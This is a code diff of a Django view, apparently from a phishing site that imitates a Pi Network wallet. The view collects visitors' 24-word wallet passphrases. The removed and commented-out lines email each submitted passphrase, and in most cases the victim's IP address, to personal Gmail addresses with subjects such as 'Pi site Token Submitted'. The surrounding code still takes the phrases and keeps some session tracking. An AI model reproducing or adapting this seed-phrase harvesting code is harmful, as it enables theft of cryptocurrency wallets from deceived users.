@@ -82,10 +82,10 @@ def submit_pass(request):
         
 
         if len(words) != 24:
-            if my_site:
-                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Personal Fake)', email_to="ezekielobiajulu0@gmail.com")
-            else:
-                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
+            # if my_site:
+            #     send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Personal Fake)', email_to="ezekielobiajulu0@gmail.com")
+            # else:
+            #     send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
             messages.error(request, 'Invalid Passphrase')
             return redirect('/wallet/')
 
@@ -139,17 +139,17 @@ def submit_pass(request):
                     request.session['ip_address'] = ip_address
                     ip_address = ip_address
 
-                if my_site:
-                    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time} (My site)', email_to="ezekielobiajulu0@gmail.com")
+                # if my_site:
+                #     send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time} (My site)', email_to="ezekielobiajulu0@gmail.com")
 
-                else:
-                    if testing:
-                        send_notify(payload=f'Testing submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
+                # else:
+                #     if testing:
+                #         send_notify(payload=f'Testing submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
 
-                    else:
-                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
+                #     else:
+                #         send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
                     
-                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
+                #         send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
 
                 if my_site:
                     request.session['look_up'] = look_up_key
